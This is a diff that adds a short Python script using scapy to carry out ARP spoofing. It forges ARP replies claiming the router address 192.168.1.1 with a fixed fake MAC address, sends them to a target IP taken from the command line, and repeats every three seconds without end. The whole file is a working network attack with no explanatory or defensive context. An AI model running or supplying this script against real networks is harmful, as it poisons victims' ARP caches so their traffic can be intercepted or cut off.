@@ -1,0 +1,17 @@
+#!/usr/bin/python
+
+from scapy.all import *
+from time import sleep
+import sys
+target = sys.argv[1]
+router = "192.168.1.1"
+
+paquet = ARP() 
+paquet.psrc = router
+paquet.pdst = target
+
+paquet.hwsrc = "00:21:00:6c:e7:74"
+
+while 1:
+	send(paquet , verbose = 0)
+	sleep(3)
